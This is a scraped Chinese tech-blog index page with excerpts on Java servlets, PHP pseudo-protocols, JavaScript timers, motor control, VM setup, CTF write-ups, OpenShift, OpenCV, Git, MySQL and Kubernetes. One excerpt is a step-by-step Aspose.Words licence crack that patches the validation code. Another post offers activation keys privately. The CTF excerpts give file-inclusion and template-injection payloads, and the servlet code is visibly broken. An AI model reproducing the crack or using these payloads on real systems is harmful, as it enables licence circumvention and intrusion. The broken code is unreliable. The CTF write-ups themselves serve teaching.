			<a href="/posts/b7774f9c7d58ce9dd92611b392b26438/" rel="bookmark">
			OA系统--userServer
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		package com.bjsxt.controller; import com.bjsxt.Employee; import com.bjsxt.service.impl.UserServicelmpl; import com.sun.net.httpserver.HttpServer; import javax.jws.WebService; import javax.servlet.ammotation.webServlet; import javax.servlet.http.HttpServlet; import javax.servlet.ServletException; import javax.servlet.http.SttpServletRequest; import javax.servlet.http.Http.HttpServletRespomse; import javax.io.IoeXCEPTION; import java.io.IOException; @WebServlet("/userServlet"); public class UserServlet extends HttpServlet { @Override protected void service(HttpServletRequest req,HttpServletResponse resp)throws servletException, IOException //设置编码个数 req.setCharactterEncoding("utf-8"); //设置编码格式 resp.setCometentType("text/html;charset=utf-8"); resp.setContentType("utf-8"); //获取请求信息 String empid = req.getParameter(s:"empid"); String password =req.getParameter(s:"password"); //处理请求 //创建业务层对象 UserServlet userServlet = new UserServicelmpl(); //调用业务层方法 Employee employee = userServlet.empLoginService(empid,password); //获取syssion中存储系统验证码 String sysCode = (String)req.getSession().getAttribute(s:"randstr"); //响应结果 resp.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b7774f9c7d58ce9dd92611b392b26438/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cac70b42f5e59d5c939dcf05a841f407/" rel="bookmark">
			PHP之伪协议
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 伪协议是什么？
PHP伪协议事实上就是支持的协议与封装协议。ctf中的文件包含、文件读取的绕过、正则的绕过等等会需要用到。
那伪协议有哪些？
file:// 、data:// 、 gopher:// 、php:// 等等，下面会讲。
PHP伪协议 【file://协议】 --------本地文件传输协议
file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受配置文件中allow_url_fopen与allow_url_include的影响。
格式：
www.xxx.com?cmd.php=file://[文件的绝对路径和文件名] file://的学问挺大的，如果对其有兴趣的可以百度细搜，在ctf中file用的较少(一般会被过滤)，这里就讲如何用，为CTF的题目做准备的。
【php://协议】 重头戏了属于是，php:// 是ctf的常客，所以关于它的故事很多。
使用条件(php.ini配置)：
allow_url_fopenallow_url_includephp://inputon/offonphp://stdinon/offonphp://memoryon/offonphp://tempon/offonphp://filteron/offon/off 看着确实挺多的，有点迷糊，但是只需要记住php://input 以及 php://filter 就行了，就这俩常用，如果想了解其它几个的作用开拓新的绕过姿势可以自己百度搜索哈哈哈。
php://filter 名称描述resource&lt;---&gt;要过滤的数据流这是个必要参数。它指定了你需要筛选过滤的数据流(简单来说就是你的数据来源)read&lt;---&gt;读链的筛选列表这个参数可选。可以设定一个或多个过滤器名称。以管道符（/）分隔write&lt;---&gt;读链的筛选列表这个参数可选。可以设定一个或多个过滤器名称。以管道符（/）分隔 看着很乏味，拿个基础题看看
[第一章 web入门]afr_1 非常基础的题目，考察点纯纯就是php://filter，想做的可以在BUU平台复现
题目给了提示，文件包含，所以这个p盲猜是include内的参数，所以直接输入flag试试 不能直接读取，那就用伪协议间接读它的源码，看看源码有什么猫腻
因为这里用了一次base64编码，用脚本解码就可以了。
小结：
遇到文件包含需要读取源码可以使用php://filter协议，格式如下
读：php://filter/resource=文件名 php://filter/read=convert.base64-encode/resource=文件名 写：php://filter/resource=文件名&amp;txt=文件内容 php://filter/write=convert.base64-encode/resource=文件名&amp;txt=文件内容 php://input ----可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。
php://input是php语言中一个只读的数据流；通过"php://input"，可以读取从Http客户端以POST方式提交、请求头“Content-Type”值非"multipart/form-data​"的所有数据；"php://input"一般用来读取POST上来，除已被处理以外的剩余数据。
说白了就是当遇到正则匹配时GET传参不能出现的敏感字符，可以通过php://input在POST上传最后绕过了检测。
格式为：
GET : index.php?cmd=php://input POST : flag.php(目的数据) 有个协议和php://input作用相同，如果碰到input被过滤的情况可以用其替代，这个协议叫data://协议，也比较常用。
和php:input不同的是data://需要 allow_url_fopen、allow_url_include都需要打开（on）。
格式也稍稍有点不同，全部是在GET实现的
file.php?file=data://text/plain;base64,SSBsb3ZlIFBIUAo= data://text/plain 是固定格式，后面如果有过滤可以用base64，内容可以是命令，也可以输出一些东西，看题目行事。
【zip://,bzip2://,zlib://协议】 zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。
【zip://协议】 格式：
zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cac70b42f5e59d5c939dcf05a841f407/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ff2e5c8e4240798dfed54df7ae529b2e/" rel="bookmark">
			JS中setTimeout()的用法详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一.setInterval与setTimeout的区别
二.setTimeout()的用法
在制作网页动态效果时，一定会遇到某些需求，要求某段程序等待多时时间后再开始执行，就像在我们的生活中一样，待会儿再开始做一件事。在JavaScript中主要通过定时器实现此类需求，本文将对定时器做一个概括，正对setTimeout()做一个详细用法总结。
一.setInterval与setTimeout的区别 setInterval
setInterval()方法可按照指定的周期来调用函数或者计算表达式（以毫秒为单位）
语法：
setInterval(函数表达式，毫秒数)；
setInterval()会不停的调用函数，直到clearInterval()被调用或者窗口被关闭，由 setInterval()返回的ID值可用作clearInterval()方法的参数。
setTimeout
setTimeout()方法用于在指定毫秒数后再调用函数或者计算表达式（以毫秒为单位）
语法：
setTimeout(函数表达式，毫秒数)；
setTimeout()只执行函数一次，如果需要多次调用可以使用setInterval(),或者在函数体内再次调用setTimeout()
区别
通过以上分析可以看出，setTimeout与setInterval的主要区别是:
setTimeout()方法只运行一次，也就是说当达到设定的时间后就出发运行指定的代码，运行完后就结束了，如果还想再次执行同样的函数，可以在函数体内再次调用setTimeout()，可以达到循环调用的效果。
setInterval()是循环执行的，即每达到指定的时间间隔就执行相应的函数或者表达式，是真正的定时器。
二.setTimeout()的用法 先写个最简单的demo，如下：
&lt;!DOCTYPE html&gt; 2 &lt;html lang="en"&gt; 3 &lt;head&gt; 4 &lt;meta charset="utf-8"&gt; 5 &lt;script&gt; 6 setTimeout("alert('hello')",2000); 7 &lt;/script&gt; 8 &lt;/head&gt; 9 &lt;body&gt; 10 &lt;/body&gt; 11 &lt;/html&gt; 页面会在停留2秒之后弹出对话框,注意setTimeout不会自动重复执行！
当然，setTimeout也可以执行function，还可以不断重复执行！
最重要的是它还解决了我回显的问题.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/21200704ec63b9f1e3f50adf2ccebc38/" rel="bookmark">
			无刷直流电机模糊PID控制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		无刷直流电机在克服了有刷直流电机机械换相缺点的同时，又具有结构简单、运行可靠以及调速性能好等优点，在很多领域中得到了广泛的应用。
本次课题阐述了无刷直流电机的基本结构、运行原理和数学模型，并以无刷直流电机为被控对象，根据电机的特点和控制要求确定了三闭环控制策略，分别是位置、转速及电流环控制三者之间实行串级连接。采用模糊PID控制理论，搭建无刷直流电机和控制器的仿真模型来验证电机控制策略的可行性，使要能使伺服控制器的具体性能满足:无静差，响应快，超调量小的设计要求。结合三闭环控制结构的特点，在位置环中采用模糊PID控制算法，内环中的电流环和转速环均采用PI调节器，并根据方案进行伺服控制系统的仿真设计。
对所设计的仿真模型进行调试，通过仿真结果显示，在采用模糊PID控制器下，给定初始位移输入，控制系统的动态性能和静态性能都得到了很大改善，模糊PID控制下的响应曲线与经典PID控制下的响应曲线相比，具有较快的响应时间，曲线平稳，误差小。最后输出的转速维持在给定数值，上下浮动很小，并且保持输出转矩恒定，满足系统的指标。
其中，位置调节器采用模糊PID调节，图3.6为位置环的模型。相对于PID调节来说，模糊PID调节器具有更好的响应速度和消除静态误差。模糊模块的输入是转角位移的偏差和偏差变化量，输出是比例系数、积分系数和微分系数的变化增量，这三个增量在分别加上其各自的设定量，同时调节转角位移，可以保证在负载变化或外界环境变化下使系统具有更好的自调节能力。
将前面设计好的模糊文件保存到MATLAB的工作区中，再将用Simulink库建好的仿真模型中的模糊控制器模块与工作区中的模糊推理系统fis结构连接起来，再设置输入输出向量个数，这样就建立了基于Matlab的无刷直流电机的模糊仿真模型。
本文以无刷直流电伺服控制系统为主题进行了分析与研究，尤其以三闭环控制策略以及模糊PID控制器的方案设计做了深入研究分析。主要做了两个方面的工作：
本文在第二三章详细分析无刷直流电机结构、工作原理，驱动方法以及数学模型的基础上，确定采用三相桥式全控驱动，并基于Simulink平台建立了其控制系统的仿真模型，设计了位置环的模糊PID调节器，以及转速环和电流环的PI调节器仿真模型，通过仿真结果分析验证了模糊PID的控制效果。
本文在第四章通过与传统PID控制方案的对比，进一步证实模糊PID在响应时间，误差和超调量上的优良之处。
总体来说，本文将模糊PID与三闭环控制策略运用到无刷直流电机控制系统中，提高了其动态及静态性能。但由于本人能力上的不足，以及时间限制，虽然提出了模糊PID控制思想，但是其控制系统较实际应用还有其不足之处，参数的设置还需进行进一步精确调整。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8b354d5e8b2e48b7162f8c41b061fbf/" rel="bookmark">
			两行代码实现Windows和Ubuntu20.04虚拟机文件复制（超精简）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		因工作需要在Windows系统中安装虚拟机，在VMware中装了Ubuntu20.04，发现文件复制粘贴无法实现拖拽，找了很多方法，都存在各种问题和不方便，操作太麻烦，终于找到两行代码实现两系统间文件直接拖拽的方法，只需要两行代码！！！
在Ubuntu中打开终端，首先输入：
sudo apt-get autoremove open-vm-tools 再输入：
sudo apt-get install open-vm-tools-desktop 安装好后重启虚拟机，发现可以将Win中文件直接拖拽到Ubuntu系统中啦，完美解决！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a285415c9cf42b872fdb6055e8957837/" rel="bookmark">
			Aspose.Words 19.X 文档转换 反编译破解 Crack
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Aspose破解教程 前言介绍**Aspose.word**准备工作正文未解除验证效果手术开始...定位验证文件分析代码逻辑 替换jar包内class文件测试破解可用性 Idea中配置Maven配置 前言 最近在研究文档转换的功能，经过对众多产品的实验与分析，最终把目光放在了Aspose旗下的words产品上。
看了大多帖子发现版本都太老了，并且讲述得不够清晰，无奈自己动手破解一个吧。以后有需要就不需要上网搜帖子了
介绍 Aspose文档转换组件是一款十分优秀的组件，Aspose于2002年3月在澳大利亚悉尼创建。公司网站于2002年10月对外发布。Aspose 一直致力于成为全球最大的.Net 组件提供商，为全球.NET 程序员提供最丰富的选择。数十个国家的数千机构选择了Aspose的产品，这包括微软、IBM、普华永道、安永、杜邦、希尔顿酒店、读者文摘、美洲银行、波音、西门子等等
Aspose.word Aspose.Words是一款先进的类库，通过它可以直接在各个应用程序中执行各种文档处理任务。Aspose.Words支持DOC，OOXML，RTF，HTML，OpenDocument, PDF, XPS, EPUB和其他格式。使用Aspose.Words，您可以生成，更改，转换，渲染和打印文档而不使用Microsoft Word。
提供多语言API .net、java、php等，不需要单独安装独立应用
声明 ！！！
本篇文章仅讨论实现思路不提供破解包，仅供学习参考，商业用途请购买正版
准备工作 下载jar包
仓库地址
本文使用19.1版本做示范，从19后期版本开始对jar包中加入了更多的代码校验，由明文显示的方式改为了byte[]形式，
同时代码关联错综复杂，为了简化本教程使用相对容易破解的版本做说明
正文 未解除验证效果 未验证版本在每页都会带上水印
手术开始… 定位验证文件 需要对jar包进行反编译,常用工具有idea 、jd-gui等
这里用jd-gui做示例，导入jar包，搜索License验证文件
分析代码逻辑 从下方的License类中可以看出jar包做了代码混淆,但这并不影响我们对代码逻辑的分析
else为验证文件的不为空执行的代码，由此可推出由 “zzY” 、"zzZIO"两个函数做的验证逻辑已知isLicensed() return 1 为验证操作，所以我们只需要更改对应函数的返回值即可 全盘复制代码，新建一个同名的.java文件复制进去
打开java文件，并对相关验证函数做修改。
就是这两个函数啦，让我们往它眼睛里弄点灰
修改后的效果：
替换jar包内class文件 将jar包和我们编写好的java文件放在相同路径中，使得编译时可以引用到，在上方地址栏输入cmd指令在本目录下打开
窗口中执行javac -cp aspose-words-19.1-jdk16.jar; zzZLJ.java 编译一个class新的class文件出来
打开jar包删除目录下的META-INF目录，目录中含有jar包校验文件不删除会报错
测试破解可用性 public class Test3 { public static void main(String[] args) { AsposeWordsUtils.convert("C:\\Users\\****\\Downloads\\15-MB-docx-file-download.docx", com.aspose.words.SaveFormat.PDF); } } 可以看到现在转换的文件已经没有水印了。至此破解成功！
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a285415c9cf42b872fdb6055e8957837/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8bf85b536a475d0b2e63fa603aabc5a8/" rel="bookmark">
			路由跳转的时候携带参数，进入页面之后让页面发送请求
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.遍历你拿到的数据，绑定click事件，并传入id（这里是对应页面需要id） &lt;div class="detail" v-for="item in $store.state.commandList" :key="item.id" @click="goMenu(item.id)" &gt; 2.进行路由的跳转，并用query携带参数 goMenu(id) { this.$router.push({ name: "musicmenu", query: { id }, }); }, 3.在对应页面拿到该参数，并发起axios请求 //这里接口是封装过的，请大家自己封装接口导入就可以 import { getMenuList } from "../../APi/getDate"; //在methods发起请求 async goMenu() { const { data: res } = await getMenuList({ id: this.$router.history.current.query.id});} //这里的id可以通过this.$router.history.current.query.id拿到 //之后拿到数据渲染上去就可以了 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dab82922b95e3aecb5616f91d4157061/" rel="bookmark">
			CTFshow web入门——爆破
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 web 21web 22web 23web 24web 25web 26web 27web 28 web 21 一.涉及工具：
burp suit burp suit 使用教程
二.解题思路：
1.随便输一个密码和用户名抓包一下
2.base64解密一下发现账号密码的形式为 账号：密码，根据题目提示我们用自定义迭代器爆破，使用方法参考：Custom iterator的使用
注：下面爆破用的字典是题目所提供的
3.爆破出结果
web 22 一.涉及知识点：
子域名爆破（此题不能爆破出来）在线子域名爆破
二.解题思路：
直接点开View Hint（提示）即可得到答案
web 23 一.涉及工具：
python
二.解题思路：
1.打开可以看到php代码，首先分析代码，可以知道 token被md5加密，且它的第一位=第十四位=第十七位，（第一位+第十四位+第十七位）/第一位=第三十一位
&lt;?php error_reporting(0); include('flag.php'); if(isset($_GET['token'])){ $token = md5($_GET['token']); if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1)){ if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1))){ echo $flag; } } }else{ highlight_file(__FILE__); } ?&gt; 2.由此我们可以知道要运用爆破，可以使用burp suit,也可以直接写脚本，下面附上脚本代码
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dab82922b95e3aecb5616f91d4157061/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/58bb4b0cb545c00089a3ed52497b6f1a/" rel="bookmark">
			web buuctf [护网杯 2018]easy_tornado1
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 分解信息量：
1.题目名称是easy-tornado：tornado是python的web框架（web框架的产生是避免程序代码与html编码的编码混乱性，框架将传参过程进行独立）
2.打开一共三个链接，分别点开
/flag.txt 提示内容：flag in /fllllllllllllag ，意思就是flag在文件fllllllllllllag里面，需要考虑怎么进入文件里面
/welcome.txt 提示内容：render，render是tornado里面的渲染函数，就是对web网页界面进行编辑的函数，和template的渲染是相似的，主要区别render是以脚本的方式进行渲染，template是以html方式进行渲染。这个重点在于是服务器模板，基本可以确定这是ssti(服务器模板注入)，服务器模板注入和sql注入等有相同性，问题的关键在于传参
/hints.txt 提示内容：md5(cookie_secret+md5(filename))，md5就是哈希编码
3.根据打开链接的url，里面有两个参数一个是filename，一个是filehash，也就是说filename是第一个文件的提示，filehash是第三个文件的提示，那么问题就是如何获取cookie_secret。
cookie_secret不是通用的属性，也就可以确定，应该是存放在服务器模板中的值，问题就转化为通过传参获取cookie_secret的值。
4.还有一个问题就是参数如何传进去，因为是服务器模板，我们需要进入服务器返回的链接进行传参，我们随便改一下filename，我改成111，传进去之后，无法识别，返回链接http://22b7dd19-d653-4f52-91bd-e3713a459849.node4.buuoj.cn:81/error?msg=Error
也就是通过msg的值进行传参
5.Templates and UI — Tornado 6.1 documentation这个链接是tornado的官方文档，一个是通过文档我们获知传参的类型，另外一个是找到cookie_secret的赋值方法
为了不让大家去翻文档查找，我给大家把有用的内容截取下来
a.在template syntax中
传递的参数值应为{{值}}的格式
b.搜索cookie_secrue
cookie_secret在tornado.web.RequestHandler中的application的settings中，也就是需要传参RequestHandler.application.settings，但是传过去提示500，
在语法中其实有提示
然后有
所以传参应为{{handler.settings}}，得到
6.用在线加解密方式进行md5计算得到filehash
flag{714597c9-0d1d-4c92-a960-4b2d1bd1f172} 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d047db8f5410a1fbd9c077a7e5db2df0/" rel="bookmark">
			OpenShift 4 - Knative教程 (7) Eventing之Broker和Trigger
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		《OpenShift 4.x HOL教程汇总》
说明：本文已经在OpenShift 4.10环境中验证
文章目录 概念操作说明部署Broker部署Service作为Sink部署Event Source部署Trigger测试验证利用Event Source验证手动发请求验证 参考 概念 Knative Eventing的Broker和Trigger对象可实现对事件进行过滤，事件的消费方可以利用这种机制只获取自己感兴趣的事件，而不是接收所有 Channel 中的事件信息。本文将向Broker发送两种不同的测试包文（报文头有区别），通过在两个Tigger中设置不同的Filter获取对应类型的Event，然后分别发给后台对应的Knative Serving的服务处理。
操作说明 部署Broker 可执行以下命令创建名为default的Broker。 $ kn broker create default -n knative-tutorial 执行命令查看生成的Broker和Service。可以看到名为default的Broker的访问地址是一个内部地址。 $ oc get all -n knative-tutorial NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE service/default-kne-trigger-kn-channel ExternalName &lt;none&gt; imc-dispatcher.knative-eventing.svc.cluster.local &lt;none&gt; 2m45s NAME URL AGE READY REASON broker.eventing.knative.dev/default http://broker-ingress.knative-eventing.svc.cluster.local/knative-tutorial/default 2m45s True NAME URL AGE READY REASON inmemorychannel.messaging.knative.dev/default-kne-trigger http://default-kne-trigger-kn-channel.knative-tutorial.svc.cluster.local 2m45s True 部署Service作为Sink 执行命令创建两个Knative的Service对象：eventingaloha和eventingbonjour ，然后查看这两个Service的的黄台都是READY=True。 $ kn service create eventingaloha --concurrency-target=1 --revision-name=eventingaloha-v1 --image=quay.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d047db8f5410a1fbd9c077a7e5db2df0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d27185fbb2bda650a5b96809c213c7cf/" rel="bookmark">
			卷积神经网络卷积后尺寸大小计算
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		卷积神经网络卷积后尺寸大小计算 1、无填充1.1 公式11.2 示例 2、有填充2.1.1 公式22.1.2 示例2.2.1 公式32.2.2 示例 1、无填充 1.1 公式1 H ′ = ( H − K [ 0 ] ) S [ 0 ] + 1 W ’ = ( W − K [ 1 ] ) S [ 1 ] + 1 \begin{aligned}\\ H' &amp;= \frac{(H-K[0])}{S[0]} + 1 \\ \\ W’ &amp;=\frac{(W-K[1])}{S[1]} + 1 \end{aligned} H′W’​=S[0](H−K[0])​+1=S[1](W−K[1])​+1​
其中:
K K K表示卷积核大小(kernel_size=(kernel_height,kernel_width)) S S S表示步幅大小(stride_size=(stride_height, stride_width)) H H H表示输入的张量的行长, H ′ H' H′表示输出张量的行长 W W W表示输入的张量的列长, W ′ W' W′表示输出张量的列长 ps:这里的除法为向下取整
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d27185fbb2bda650a5b96809c213c7cf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b636b10f0077b3f6d5d0627c5902f0a/" rel="bookmark">
			Win10 Visual Studio 2019 安装配置opencv4全过程(超详细，实测成功)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Win10 Visual Studio 2019 安装配置opencv全过程(超详细，实测成功) 文章目录 Win10 Visual Studio 2019 安装配置opencv全过程(超详细，实测成功) 0.前期准备0.1 Visual Studio2019安装包(下面简称VS2019)：0.2 OpenCV4安装包: 1.安装1.1 VS安装1.2 Opencv安装 2.环境配置3.将Opencv部署到VS20194.以一个简单的项目验证安装成功参考文献： 大家在安装部署过程中一定要仔细，按步骤来一定可以成功，如果过程中出现什么问题或者报错，欢迎大家po到评论区或者私信我，一起解决。 0.前期准备 前期准备包括需要下载的文件，以及下载地址注意事项等。 0.1 Visual Studio2019安装包(下面简称VS2019)： 下载地址(复制粘贴到浏览器地址框回车即可): https://visualstudio.microsoft.com/zh-hans/downloads/
**注意事项**： 1.安装免费下载的社区版即可。 2.如果需要专业版激活码可以私信我。 3.尽量不要下载在C盘中。 0.2 OpenCV4安装包: 下载地址：https://opencv.org/releases/
**注意事项**： 1.下载最新版本就好，我这里最新版本是4.5.4【注意这个版本号在之后有用，要记住你自己下载的opencv版本号，比如我这里就是4.5.4】。 2.进入下载界面之后点击Windows下载windows版本，它会是一个.exe文件。 3.同上尽量不要下载在C盘中。 这里多说一句网上有很多说安装4.1之前的版本有各种好处，个人建议大家刚开始就从最新版本开始玩，玩明白就好了。什么版本其实都一样。
1.安装 1.1 VS安装 这里非常简单，除了安装目录之外，其余的一路默认选项同意下一步过去即可；安装目录一定不要选择系统盘(一般为C盘)
1.2 Opencv安装 下载完Opencv后得到一个后缀名为.exe的可执行文件，其实就是一个自解压程序，双击它后会提示用户选择解压路径，点击窗口右侧三个点儿可以编辑安装路径，这里推荐在D盘中创建一个文件夹命名为"opencv4.5"，为了避免安装多个opencv无法区分。
**重要：** 1.解压后检查之前选择的路径下是否有一个_*名为opencv的文件夹*_。 2.打开opencv文件夹后检查_*文件夹中是否有build和source两个子文件夹*_。 如果没有说明解压错误，建议全部删除之后重新解压 2.环境配置 这一步比较重要大家一定要仔细的按照下面步骤来：
(1)打开我的电脑(如下图所示)
(2)右键点击屏幕左侧的“此电脑” (如下图所示)
(3)点击屏幕右侧“高级系统设置”(如下图所示)
(4)点击“环境变量”(如下图所示)
(5)在下面的系统变量中找到“Path”一行(如下图所示)
ps:其实大家用的大多是自己的电脑，所以上下的用户变量和系统变量中都有pyth都是一样的，没什么区别，但是由于一台计算机可以有多个用户，因此建议在系统变量里添加路径。
(6)点击path后点击“编辑”(如下图所示)
(7)点击“新建”(如下图所示)
(8)最最最重要的的的一步！！！
找到刚才解压opencv 的文件夹按顺序点进文件：opencv-&gt;build-&gt;x64-&gt;vc15-&gt;bin
然后左键单击文件夹中的地址栏(如下图所示)
复制地址栏中的地址粘贴到(7)的位置中。
(9)一路点击确定。完成环境配置。
到以上其实Opencv已经安装完成了，但是想要在VS2019中写我们的C++代码还需要再VS2019中对Opencv进行部署。
3.将Opencv部署到VS2019 (1)首先打开VS2019 新建一个项目，空项目即可(如下图所示)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7b636b10f0077b3f6d5d0627c5902f0a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bef854e135f64214e23c03fde1281ddf/" rel="bookmark">
			Java：IDEA结合Git和Gitee的简单使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
开篇
为什么要在IDEA中提交代码？使用命令行或者“小乌龟”不是也能够提交吗？
什么是Git？
Git的工作流程
三个概念 Git的几个命令
什么是Gitee？
Git和Gitee怎么和IDEA结合？
步骤一：在Gitee上创建一个仓库
步骤二：将代码克隆到本地
步骤三：IDEA中识别git.exe
步骤四：创建项目，项目路径为当前的仓库的路径
开篇 作为未来的程序员，我们应该要能够熟练地使用Git来提交自己的代码、管理自己的代码。接下来，我将以初学者的角度通过这篇文章来帮助大家了解最基本的Git和如何在IDEA中直接快速地提交代码。
为什么要在IDEA中提交代码？使用命令行或者“小乌龟”不是也能够提交吗？ 1. 命令行就不用说了，其需要输入特定的指令，相对来说比较麻烦，不推荐初学者使用
2. “小乌龟”（有需要的可以到官网下载或者私信我发安装包）与在IDEA中进行操作复杂度差不多，但是没写一段代码就要去文件夹中提交一次，效率相对来说会低一些，我比较喜欢的是在一个工程中每写一个类就提交一次，所以在IDEA中操作就会简便非常多
什么是Git？ Git是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或大或小的项目。
Git的工作流程 三个概念 1. 工作区：在电脑中所能够看到的目录
2. 暂存区：英文叫stage或index。一般存放在.git目录下的index文件中，所以优势可以把暂存区叫做索引
3. 版本库/本地仓库：工作区有一个隐藏目录.git，这个不算工作区，而是Git的版本库
Git的几个命令 以上是比较全面的Git提交代码的流程，以供参考（如果有不知道怎么安装Git的可以私信我）。
什么是Gitee？ 前面介绍的Git是一个版本管理工具，而Gitee是一个类似于GitHub的用来存放代码的云端。通过Git这样的工具，可以将代码上传到云端Gitee，当然Git不仅仅只是一个上传代码的工具，它同时是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件；还与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持……有兴趣可以看看这个教程，进一步了解Git：Git 教程 | 菜鸟教程
Git和Gitee怎么和IDEA结合？ 准备：IDEA（官网下载或者私信我发安装包）、Git工具、Gitee账号（其中有任何不懂的步骤都可以私信问我或者评论区留下问题）
步骤一：在Gitee上创建一个仓库 步骤二：将代码克隆到本地 步骤三：IDEA中识别git.exe 打开IDEA
最后点Apply，再点OK即可识别git.exe。 步骤四：创建项目，项目路径为当前的仓库的路径 但有时候还会出现一个报错信息的页面（原因是在其中注释里出现中文字符或者其他不符合IDEA等东西）—— 这些都直接不用管即可不论何时都是点commit and push。 还有就是在第一次提交的时候有可能会要求输入用户名和密码，这里就直接输入自己在登录Gitee是使用的用户名和密码即可。
此外，后面的文章还会讲Gitee在IDEA中的插件有哪些&amp;如何在IDEA中使用Gitee插件等。敬请期待……
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/793f57a02f016cd90ea4e512f4917168/" rel="bookmark">
			Mysql常用用法总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SQL 分为四类 1、DML（数据操作语言）操作数据库中的数据（insert、update、delete） 2、DDL（数据定义语言）创建、删除、修改数据库、数据表 3、DQL（数据查询语言）对数据库中的数据进行查询（select） 4、DCL（数据控制语言）用来提交数据库事务（commit、rollback） 目录 一、管理数据库结构
1、操作数据库SQL2、操作数据表SQL 3、SQL函数 4、SQL运算符 5、数据CRUD 二、表关系
1、表设计 2、表之间关系 三、多表关联查询
1、关联查询 2、一对多关联查询 3、多对多关联查询4、去重distinct 5、分页limit 四、数据库索引Index
1、 数据库索引2、数据库索引机制的实现 五、事务Transaction
1、 事务2、Mysql的事务隔离机制 六、视图View
七、触发器Trigger
八、存储过程Procedure
一、管理数据库结构 返回顶部目录 数据库 -》数据表 -》数据
1、操作数据库 SQL 返回顶部目录 1、创建数据库
create database 数据库名称 default character set utf8 collate utf8_general_ci; 2、删除数据库
drop database 数据库名称; 3、查看数据库
show databases; 4、选择数据库
use 数据库名称;	2、 操作数据表 SQL 返回顶部目录 1、创建数据表
create table 数据表名( 字段信息 字段名 数据类型, ); create table student( id int, name varchar(10), score int ); 2、删除数据表
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/793f57a02f016cd90ea4e512f4917168/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7421f8deea5ce2175978532e3a93c252/" rel="bookmark">
			k8s集群StatefulSets的Pod优雅调度问题思考？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		k8s集群StatefulSets的Pod优雅调度问题思考？ 考点之你能解释一下为什么k8s的 StatefulSets 需要VolumeClaimTemplate嘛？ 考点之简单描述一下StatefulSets 对Pod的编排调度过程？ 考点之针对线上StatefulSet 的Pod缩容故障无法正常缩容的情况，你能灰度分析一下嘛？ 考点之聊聊什么是StatefulSet的分区滚动更新吧？什么场景需要使用分区更新？ 考点之StatefulSet提供优雅稳定的存储，但是线上告警StatefulSet Pod重新调度后数据丢失？ 囧么肥事-胡说八道 你能解释一下为什么k8s的 StatefulSets 需要VolumeClaimTemplate嘛？ 对于k8s集群来说有状态的副本集都会用到持久存储。
Deployment中的Pod template里定义的存储卷，是基于模板配置调度，所有副本集共用一个存储卷，数据是相同的。
